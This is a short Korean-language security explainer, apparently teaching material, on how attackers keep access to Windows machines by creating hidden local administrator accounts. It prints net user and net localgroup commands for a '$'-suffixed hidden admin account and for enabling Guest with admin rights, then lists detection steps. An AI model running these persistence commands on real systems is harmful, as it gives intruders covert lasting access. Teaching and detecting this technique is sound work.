몰래 만든 뒷문 열쇠 — 숨겨진 로컬 계정 생성

#1. 공격자가 로컬 계정을 만드는 이유

🔑 ➜ 🚪 ➜ 🕵️ ➜ 💥

"몰래 만든 뒷문 열쇠"

도둑이 처음 집에 침입할 때는 창문을 깨고 들어왔지만, 다음에도 같은 방법을 쓰면 들킬 위험이 큽니다. 그래서 도둑은 몰래 뒷문 열쇠를 만들어 둡니다. 공격자도 마찬가지로, 처음 침투에 성공한 후 새로운 로컬 관리자 계정을 만들어 언제든 정상적인 로그인으로 다시 접근할 수 있는 백도어를 확보합니다.

왜 악성코드 대신 계정을 만드는가?

🛡️
백신 우회

계정 생성은 정상 관리 작업이므로 백신이 차단하지 않습니다.

🔄
안정적 접근

RDP, SSH 등 정상 프로토콜로 로그인하므로 네트워크 탐지도 어렵습니다.

📋
흔적 최소화

악성코드 파일이 없으므로 포렌식 분석에서 발견되기 어렵습니다.

#2. 숨겨진 계정 생성 기법

net user /add 명령어

# 1단계: 새 계정 생성
net user support$ P@ssw0rd2026! /add

# 2단계: 관리자 그룹에 추가
net localgroup administrators support$ /add

# '$'로 끝나는 이름 → net user 목록에서 숨겨짐!

$ 접미사 트릭

계정 이름 끝에 $를 붙이면 net user 명령어 목록에서 숨겨집니다. 관리자가 일반적으로 확인하는 방법으로는 발견하기 어렵습니다.

C:\> net user

Administrator  Guest  user01
# support$ 는 표시되지 않음!

레지스트리 직접 조작

더 은밀한 방법으로 SAM 레지스트리를 직접 수정하여 계정을 숨기거나, 기존 비활성 계정(Guest)을 활성화하고 관리자 권한을 부여합니다.

# Guest 계정 활성화 + 관리자 추가
net user Guest /active:yes
net localgroup administrators
 Guest /add
net user Guest P@ss123!

탐지 방법

1. Event ID 4720 (계정 생성) 모니터링
2. Event ID 4732 (보안 그룹에 멤버 추가) 모니터링
3. wmic useraccount list로 $계정 포함 전체 목록 확인
4. 정기적인 관리자 그룹 멤버십 감사
